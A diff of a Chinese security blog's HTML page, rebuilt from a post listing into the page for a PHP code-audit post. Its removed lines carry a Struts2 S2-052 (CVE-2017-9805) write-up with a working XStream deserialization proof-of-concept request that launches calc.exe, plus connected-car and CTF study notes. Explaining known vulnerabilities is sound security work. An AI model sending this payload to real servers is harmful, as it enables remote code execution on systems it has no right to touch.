@@ -3,19 +3,26 @@
 <head>
   <meta charset="utf-8">
   
-  <title>shackle</title>
+  <title>php 代码审计_知识点 | shackle</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
+  <meta name="keywords" content="代码审计" />
   
   
   
-  <meta property="og:type" content="website">
-<meta property="og:title" content="shackle">
-<meta property="og:url" content="https://shackles.top/page/2/index.html">
+  
+  <meta name="description" content="PHP 代码审计_知识点来源于某大神~  感谢！ 1.XSS1.1反射型XSS0x01漏洞背景XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计 算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。非持久型跨站：反射型跨站脚本漏洞，最普遍的类型。 0x">
+<meta name="keywords" content="代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP 代码审计_知识点">
+<meta property="og:url" content="https://shackles.top/2017/09/05/PHP 代码审计_知识点/index.html">
 <meta property="og:site_name" content="shackle">
+<meta property="og:description" content="PHP 代码审计_知识点来源于某大神~  感谢！ 1.XSS1.1反射型XSS0x01漏洞背景XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计 算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。非持久型跨站：反射型跨站脚本漏洞，最普遍的类型。 0x">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-04-04T12:01:04.136Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="shackle">
+<meta name="twitter:title" content="PHP 代码审计_知识点">
+<meta name="twitter:description" content="PHP 代码审计_知识点来源于某大神~  感谢！ 1.XSS1.1反射型XSS0x01漏洞背景XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计 算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。非持久型跨站：反射型跨站脚本漏洞，最普遍的类型。 0x">
   
     <link rel="alternate" href="/atom.xml" title="shackle" type="application/atom+xml">
   
@@ -47,11 +54,13 @@
   <link rel="stylesheet" href="/css/bootstrap.css" >
 
   
-    <link rel="stylesheet" href="/css/home.css" >
+    <link rel="stylesheet" href="/css/dialog.css">
   
 
   
 
+  
+    <link rel="stylesheet" href="/css/header-post.css" >
   
 
   
@@ -62,375 +71,107 @@
 
 
 
-  <body>
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
 
 
-  
-    <header id="header">
-
-	<!-- 背景图模式 -->
-	
-
-    
-      <div id="intrologo" class="intro-logo" style="background-position:center; background-repeat:no-repeat; background-image: url(); background-size: auto 100%;">
-
-      <!-- Support rolling -->  
-        
-        <section class="awSlider">
-          <div class="carousel slide carousel-fade " data-ride="carousel">
-
-            <!-- Wrapper for slides -->
-            <div class="carousel-inner">
-               
-                  
-                    <div class="item active">
-                  
-                    <img id="carousel-img0" src="http://osuq6jhys.bkt.clouddn.com/wqfe.jpg">
-                  </div>
-
-                  <!-- 自适应大图 -->
-                  <script>
-                      var img0 = new Image();
-                      var imageTag0 = document.getElementById("carousel-img0");
-                      img0.src = imageTag0.src;
-                      img0.onload=function(){
-                        if (img0.width / img0.height <= document.body.clientWidth / document.body.clientHeight) {
-                          imageTag0.style.width = document.body.clientWidth + "px";
-                        } else {
-                          imageTag0.style.height = document.body.clientHeight + "px";
-                          imageTag0.style.marginLeft = -(document.body.clientHeight * img0.width / img0.height - document.body.clientWidth) / 2 + "px";
-                        }
-                      };
-                  </script>
-                
-                  
-                    <div class="item">
-                  
-                    <img id="carousel-img1" src="https://source.unsplash.com/1920x1080/?nature">
-                  </div>
-
-                  <!-- 自适应大图 -->
-                  <script>
-                      var img1 = new Image();
-                      var imageTag1 = document.getElementById("carousel-img1");
-                      img1.src = imageTag1.src;
-                      img1.onload=function(){
-                        if (img1.width / img1.height <= document.body.clientWidth / document.body.clientHeight) {
-                          imageTag1.style.width = document.body.clientWidth + "px";
-                        } else {
-                          imageTag1.style.height = document.body.clientHeight + "px";
-                          imageTag1.style.marginLeft = -(document.body.clientHeight * img1.width / img1.height - document.body.clientWidth) / 2 + "px";
-                        }
-                      };
-                  </script>
-                
-                  
-                    <div class="item">
-                  
-                    <img id="carousel-img2" src="https://source.unsplash.com/collection/954550/1920x1080">
-                  </div>
-
-                  <!-- 自适应大图 -->
-                  <script>
-                      var img2 = new Image();
-                      var imageTag2 = document.getElementById("carousel-img2");
-                      img2.src = imageTag2.src;
-                      img2.onload=function(){
-                        if (img2.width / img2.height <= document.body.clientWidth / document.body.clientHeight) {
-                          imageTag2.style.width = document.body.clientWidth + "px";
-                        } else {
-                          imageTag2.style.height = document.body.clientHeight + "px";
-                          imageTag2.style.marginLeft = -(document.body.clientHeight * img2.width / img2.height - document.body.clientWidth) / 2 + "px";
-                        }
-                      };
-                  </script>
-                
-            </div>
-
-            <!-- Controls -->
-            <a class="left carousel-control" href=".carousel" role="button" data-slide="prev">
-              <span class="glyphicon glyphicon-chevron-left" aria-hidden="true"></span>
-              <span class="sr-only">Geri</span>
-            </a>
-            <a class="right carousel-control" href=".carousel" role="button" data-slide="next">
-              <span class="glyphicon glyphicon-chevron-right" aria-hidden="true"></span>
-              <span class="sr-only">İleri</span>
-            </a>
-          </div>
-        </section>
-        <script>
-          $('section.awSlider .carousel').carousel({
-              pause: '',
-              interval: 5000
-          });
-          var startImage = $('section.awSlider .item.active > img').attr('src');
-          $('section.awSlider .carousel').on('slid.bs.carousel', function () {
-              var bscn = $(this).find('.item.active > img').attr('src');
-              $('section.awSlider > img').attr('src', bscn);
-          });
-        </script>
-      
-
-    
- 
-
-
-    <canvas width="100%" height="100%"></canvas>
-    <script>
-      var c = document.getElementsByTagName('canvas')[0],
-          x = c.getContext('2d'),
-          w = window.innerWidth,
-          h = window.innerHeight,
-          pr = window.devicePixelRatio || 1,
-          f = 90,
-          q,
-          m = Math,
-          r = 0,
-          u = m.PI*2,
-          v = m.cos,
-          z = m.random
-      c.width = w*pr
-      c.height = h*pr
-      x.scale(pr, pr)
-      x.globalAlpha = 0.6
-
-      <!-- 折线Polyline背景 -->
-      
-    </script>
-    
-
-    
-      <div id="homelogo" class="homelogo" style="background: rgba(255,255,255,1);"> 
-    
-
-        
-          <div class="homelogoback"  style="border: 1px solid #404040;" >
-            <h1><a href="#content" id="logo">shackle</a></h1>
-            <h3></h3>
-            <h5>shackle</h5>
-            <!-- <p><a href="https://github.com/iTimeTraveler" target="_blank">Github</a></p> -->
-          </div>
-        
-    
-    </div>
-  </div>
-
-  <!-- 自适应主页背景大图 -->
-  
-
- <!-- home_logo_image居中 -->
- 
-    <script>
-        var homelogodiv = document.getElementById("homelogo");
-        if (document.all.homelogo.offsetWidth > document.body.clientWidth) {
-          homelogodiv.style.width = document.body.clientWidth + "px";
-          homelogodiv.style.marginLeft = document.body.clientWidth * -0.5 + "px";
-        } else {
-          homelogodiv.style.width = homelogodiv.clientWidth  + "px";
-          homelogodiv.style.marginLeft = (homelogodiv.clientWidth)  * -0.5 + "px";
-        }
-    </script>
-  
-
-  <div class="intro-navigate">
-      <p class="navigater-list">
-        
-          <a id="beautifont" class="main-nav-link" href="/">首页</a>
-        
-          <a id="beautifont" class="main-nav-link" href="/archives">归档</a>
-        
-          <a id="beautifont" class="main-nav-link" href="/categories">分类</a>
-        
-          <a id="beautifont" class="main-nav-link" href="/tags">标签</a>
-        
-          <a id="beautifont" class="main-nav-link" href="/about">关于</a>
-        
-      </p>
-  </div>
-
-</header>
   
   <div id="container">
     <div id="wrap">
       
+        <header>
+
+    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
+        <div class="navbar-inner">
+          
+          <div class="container"> 
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+              <span class="sr-only">Toggle navigation</span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+
+            
+              <a class="brand" style="
+                 margin-top: 0px;"  
+                href="#" data-toggle="modal" data-target="#myModal" >
+                  <img width="124px" height="124px" alt="Hike News" src="/css/images/mylogo1.jpg">
+              </a>
+            
+            
+            <div class="navbar-collapse collapse">
+              <ul class="hnav navbar-nav">
+                
+                  <li> <a class="main-nav-link" href="/">首页</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/archives">归档</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/categories">分类</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/tags">标签</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/about">关于</a> </li>
+                
+                  <li><div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="请输入关键词..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(无标题)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div></li>
+            </div>
+          </div>
+                
+      </div>
+    </div>
+
+</header>
+
+
+
+      
             
       <div id="content" class="outer">
         
-          <section id="main" style="float:none;">
-  
-    <article id="post-车联网安全基础"  class="article article-type-post" itemscope itemprop="blogPost" >
+          <section id="main" style="float:none;"><article id="post-PHP 代码审计_知识点" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="article-inner">
     
     
       <header class="article-header">
         
   
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2017/09/09/车联网安全基础/">车联网安全</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2017/09/09/车联网安全基础/" class="article-date">
-	  <time datetime="2017-09-09T15:53:56.000Z" itemprop="datePublished">2017-09-09</time>
-	</a>
-
-      
-      
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="车联网安全基础"><a href="#车联网安全基础" class="headerlink" title="车联网安全基础"></a>车联网安全基础</h1><p><a href="http://shackles.top/2017/08/02/%E8%BD%A6%E8%81%94%E7%BD%91/"> 2017-08-02</a></p>
-<h3 id="车联网"><a href="#车联网" class="headerlink" title="车联网"></a>车联网</h3><h5 id="汽车现状：智能化-，网联化，电动化"><a href="#汽车现状：智能化-，网联化，电动化" class="headerlink" title="汽车现状：智能化 ，网联化，电动化"></a>汽车现状：智能化 ，网联化，电动化</h5><ol>
-<li><p>车载系统</p>
-</li>
-<li><p>​</p>
-</li>
-<li><p>安全现状 ：</p>
-</li>
-<li><p>车联网安全解决方案</p>
-<ol>
-<li>终端<ol>
-<li>设计</li>
-<li>ids</li>
-</ol>
-</li>
-<li>网络<ol>
-<li>车内部可信机制</li>
-<li>车与智能手机</li>
-<li>车网络服务</li>
-</ol>
-</li>
-<li>云服务</li>
-</ol>
-</li>
-<li><p>标准规范</p>
-<h3 id="车载网络"><a href="#车载网络" class="headerlink" title="车载网络"></a>车载网络</h3></li>
-<li><p>CSMA/CD 带冲突检测控制</p>
-</li>
-<li><p>CAN总线</p>
-<ol>
-<li>主要测传输机制csma/cd</li>
-<li>CAN是控制器局域网络(Controller Area Network, CAN)的简称</li>
-<li>一种通讯协议（类似TCP IP协议）</li>
-<li>​</li>
-</ol>
-</li>
-<li><p>车载网络 C类网络</p>
-</li>
-</ol>
-<ol>
-<li>录制重放</li>
-<li>隔离重放</li>
-<li>实时</li>
-<li>man-in-the-middle</li>
-</ol>
-<p>###</p>
-<p>手机卡</p>
-<p>HMI 与车内 网络<br>软件操作系统的安全性、通讯安全、对于安全持续度量。</p>
-<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><p>自动驾驶安全性问题</p>
-<ol>
-<li>方程式 Al</li>
-<li>内部攻击</li>
-<li><ol>
-<li>传感信号伪造​</li>
-</ol>
-</li>
-<li>自动驾驶以及车联网的整体安全架构<ol>
-<li>系统安全的设计</li>
-<li>车通讯</li>
-<li>车就是个内网<br>重放 篡改</li>
-</ol>
-</li>
-<li>网络与系统<br>防御与攻击</li>
-<li>app加固</li>
-<li>车联网安全 T-BOX（网络） CAN总线（控制汽车）</li>
-</ol>
-
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/物联网安全/">物联网安全</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-Struts2 远程代码执行漏洞S2-052"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2017/09/06/Struts2 远程代码执行漏洞S2-052/">Struts2 远程代码执行漏洞S2-052</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2017/09/06/Struts2 远程代码执行漏洞S2-052/" class="article-date">
-	  <time datetime="2017-09-06T15:53:56.000Z" itemprop="datePublished">2017-09-06</time>
-	</a>
-
-      
-      
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Struts2-远程代码执行漏洞S2-052"><a href="#Struts2-远程代码执行漏洞S2-052" class="headerlink" title="Struts2 远程代码执行漏洞S2-052"></a>Struts2 远程代码执行漏洞S2-052</h1><p><a href="http://shackles.top/2017/09/06/S2-052/"> 2017-09-06</a></p>
-<h2 id="Struts2-远程代码执行漏洞-S2-052"><a href="#Struts2-远程代码执行漏洞-S2-052" class="headerlink" title="Struts2 远程代码执行漏洞 : S2-052"></a>Struts2 远程代码执行漏洞 : S2-052</h2><p>Struts2 应用又曝出存在新的高危远程代码执行漏洞。该漏洞由lgtm.com的安全研究员汇报，编号为 CVE-2017-9805 ，漏洞危害程度为高危（Critical）。当用户使用带有 XStream 程序的 Struts REST 插件来处理 XML payloads 时，可能会遭到远程代码执行攻击。</p>
-<ul>
-<li>前提：启用Strut REST 插件。</li>
-<li>Struts 2.5 – Struts 2.5.12 版本</li>
-<li>官方公告：<a href="https://cwiki.apache.org/confluence/display/WW/S2-052" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-052</a></li>
-<li>漏洞编号：S2-052</li>
-<li>CVE-2017-9805</li>
-</ul>
-<h3 id="S2-052概述"><a href="#S2-052概述" class="headerlink" title="S2-052概述"></a>S2-052概述</h3><p>Struts2 REST 插件使用带有 XStream 程序的 XStream Handler 进行未经任何代码过滤的反序列化操作，这可能在反序列化XML payloads时导致远程代码执行。任意攻击者都可以构造恶意的XML内容提升权限。</p>
-<p>漏洞是由 Semmle 使用其开源分析工具 lgtm 及 QL 语言编写的 Java 反序列威胁查询检测而出的，详情可参考<br><a href="https://lgtm.com/blog/apache_struts_CVE-2017-9805" target="_blank" rel="noopener">https://lgtm.com/blog/apache_struts_CVE-2017-9805</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">org.apache.struts2.rest.handler.AllowedClasses</span><br><span class="line"></span><br><span class="line">org.apache.struts2.rest.handler.AllowedClassNames</span><br><span class="line"></span><br><span class="line">org.apache.struts2.rest.handler.XStreamPermissionProvider</span><br></pre></td></tr></table></figure>
-<h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET /struts2-rest-showcase/orders.xhtml HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Referer: http://127.0.0.1:8080/struts2-rest-showcase/orders/3/edit</span><br><span class="line">Cookie: JSESSIONID=6FBA41434A908795E708AE545267C797; UM_distinctid=15e36471d10d0-09d67d334fbd0f8-49594234-100200-15e36471d11231; CNZZDATA1670348=cnzz_eid%3D1690420666-1504145890-%26ntime%3D1504329636</span><br><span class="line">Connection: close</span><br><span class="line">If-None-Match: 182927695</span><br><span class="line">Content-Length: 1647</span><br><span class="line"></span><br><span class="line">&lt;map&gt; </span><br><span class="line">&lt;entry&gt; </span><br><span class="line">&lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt; &lt;dataHandler&gt; &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt; &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt; &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt; &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt; &lt;string&gt;C:\Windows\System32\calc.exe&lt;/string&gt; &lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; </span><br><span class="line">&lt;/entry&gt; </span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="效果如下："><a href="#效果如下：" class="headerlink" title="效果如下："></a>效果如下：</h3><p><a href="http://osuq6jhys.bkt.clouddn.com/s2-052.png" target="_blank" rel="noopener"><img src="http://osuq6jhys.bkt.clouddn.com/s2-052.png" alt="效果图"></a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-PHP 代码审计_知识点"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2017/09/05/PHP 代码审计_知识点/">PHP 代码审计_知识点</a>
+    <h1 class="thumb" class="article-title" itemprop="name">
+      PHP 代码审计_知识点
     </h1>
   
 
@@ -444,6 +185,8 @@
 
       
       
+
+
     </div>
     <div class="article-entry" itemprop="articleBody">
       
@@ -651,768 +394,73 @@
     <footer class="article-footer">
       
       
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8zNTMwOS8xMTg0NQ">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
 
     </footer>
   </div>
   
-</article>
-
-<!-- Table of Contents -->
-
+    
+<nav id="article-nav">
   
-    <article id="post-CTF-逆向 基础"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="article-inner">
-    
-    
-      <header class="article-header">
+    <a href="/2017/09/06/Struts2 远程代码执行漏洞S2-052/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">上一篇</strong>
+      <div class="article-nav-title">
         
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2017/08/29/CTF-逆向 基础/">CTF-逆向 基础</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2017/08/29/CTF-逆向 基础/" class="article-date">
-	  <time datetime="2017-08-29T15:53:56.000Z" itemprop="datePublished">2017-08-29</time>
-	</a>
-
-      
-      
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="CTF-逆向-基础"><a href="#CTF-逆向-基础" class="headerlink" title="CTF-逆向 基础"></a>CTF-逆向 基础</h1><p><a href="http://shackles.top/2017/08/07/%E9%80%86%E5%90%91/"> 2017-08-07</a></p>
-<p><a href="https://www.gitbook.com/book/wizardforcel/re-for-beginners/details" target="_blank" rel="noopener">https://www.gitbook.com/book/wizardforcel/re-for-beginners/details</a></p>
-<h4 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h4><ul>
-<li>ida 调试 安卓 native层</li>
-<li>设置断点</li>
-<li>设置程序 安卓附加上去，IDA F5调试</li>
-</ul>
-<h4 id="去除软件保护"><a href="#去除软件保护" class="headerlink" title="去除软件保护"></a>去除软件保护</h4><ul>
-<li><p>侦壳 PEID Exelnfo （查看是什么壳）</p>
-</li>
-<li><p>脱壳</p>
-<ul>
-<li>脱壳机</li>
-<li>esp 定快速脱壳</li>
-</ul>
-</li>
-<li><p>去除花指令</p>
-<ul>
-<li>OLLyDBG脚本</li>
-</ul>
-</li>
-<li><p>去除混淆</p>
-<ul>
-<li><p>net 反混淆de4dot</p>
-<h4 id="定位验证代码"><a href="#定位验证代码" class="headerlink" title="定位验证代码"></a>定位验证代码</h4></li>
-</ul>
-</li>
-<li><p>验证代码（算法）</p>
-<ol>
-<li><p>正面驱动直入</p>
-</li>
-<li><p>从输入输出寻找</p>
-</li>
-<li><p>利用字符串找</p>
-<h4 id="CTF逆向常见算法"><a href="#CTF逆向常见算法" class="headerlink" title="CTF逆向常见算法"></a>CTF逆向常见算法</h4></li>
-</ol>
-</li>
-<li><p>简单算法</p>
-</li>
-</ul>
-<ol>
-<li>简单异或</li>
-<li>带雪崩的异或</li>
-<li>加密算法（AES , RSA)</li>
-<li>散列算法（MD5，SHA1)</li>
-<li>解方程</li>
-</ol>
-<ul>
-<li>有趣的算法</li>
-</ul>
-<ol>
-<li><p>走迷宫</p>
-</li>
-<li><p>..各种脑洞</p>
-<h4 id="经验加成"><a href="#经验加成" class="headerlink" title="经验加成"></a>经验加成</h4></li>
-<li><p>边信道攻击</p>
-</li>
-<li><p>Google 大法好</p>
-</li>
-<li><p>逆向trick</p>
-<ol>
-<li>xspy 应对MFC程序</li>
-<li>手动加载signature</li>
-<li>调试小技巧</li>
-</ol>
-</li>
-</ol>
-<p>CTF VS 现实</p>
-<ol>
-<li><p>IDA高级使用</p>
-</li>
-<li><p>​</p>
-</li>
-</ol>
-
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-ctf-misc"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="article-inner">
-    
-    
-      <header class="article-header">
+          Struts2 远程代码执行漏洞S2-052
         
+      </div>
+    </a>
   
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2017/08/19/ctf-misc/">CTF-Misc</a>
-    </h1>
   
+    <a href="/2017/08/29/CTF-逆向 基础/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">CTF-逆向 基础</div>
+    </a>
+  
+</nav>
 
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2017/08/19/ctf-misc/" class="article-date">
-	  <time datetime="2017-08-19T15:53:56.000Z" itemprop="datePublished">2017-08-19</time>
-	</a>
-
-      
-      
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="CTF-Misc"><a href="#CTF-Misc" class="headerlink" title="CTF-Misc"></a>CTF-Misc</h1><p><a href="http://shackles.top/2017/08/06/misc/"> 2017-08-06</a></p>
-<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="先上一些常用命令"><a href="#先上一些常用命令" class="headerlink" title="先上一些常用命令"></a>先上一些常用命令</h2><p>strings // 查找字符</p>
-<p>foremost // 自动分离</p>
-<p>binwalk // binwalk -e 自动提取</p>
-<p>diff // 对比文件</p>
-<p>pacpfix // pcap文件修复工具</p>
-<p>DShell</p>
-<p>tshark // 命令行提取数据包 或者tcpdump</p>
-<h3 id="Recon-信息收集"><a href="#Recon-信息收集" class="headerlink" title="Recon(信息收集)"></a>Recon(信息收集)</h3><p>很少出现</p>
-<h3 id="Encode"><a href="#Encode" class="headerlink" title="Encode"></a>Encode</h3><p>编码</p>
-<ul>
-<li><p>各种进制</p>
-<p>​</p>
-<p>二进制转化为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ASCII</span><br><span class="line">二维码</span><br><span class="line">图片</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>base家族 base64 32 16</p>
-</li>
-<li><p>曼彻斯特编码/差分曼彻斯特编码</p>
-</li>
-</ul>
-<h4 id="二进制编码"><a href="#二进制编码" class="headerlink" title="二进制编码"></a>二进制编码</h4><p>工具：JpocketKnife<br>1.得到的二进制有可能7位一组，正常八位一组<br>2.二维码：二进制串的长度是一个平方数<br>3.因式分解其长度</p>
-<h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><p>编码方式：</p>
-<ul>
-<li>字符对应ASCII转换成八位二进制</li>
-<li>base64的基础单位是 3<em>8bit的二进制，若是不够3</em>8bit则在后面添加0字节（padding）直至满足</li>
-<li>3<em>8bit的二进制转换成4</em>6bit的二进制</li>
-<li>4*6bit的二进制转换成十进制</li>
-<li>对照base64表把十进制转换成字符</li>
-</ul>
-<p>解码方式:</p>
-<ul>
-<li>检查base64编码后面有几个等于号</li>
-<li>把字符串按照base64表转换成4*6的倍数位数二进制</li>
-<li>删除等于号的个数*8的bit</li>
-<li>按照6个bit一组转成字符</li>
-<li>可以发现，编码和解码的方式并非完全对称的，解码的时候直接根据等号的数量删除bit,如果我们把数据写到填充的0的前两位，那么就可以实现隐写的功能。</li>
-</ul>
-<p>判断方法: 先解码在编码，和原字符串对比，若不一样就是有隐写</p>
-<ul>
-<li><a href="http://www.atool.org(编码工具集)" target="_blank" rel="noopener">www.atool.org(编码工具集)</a></li>
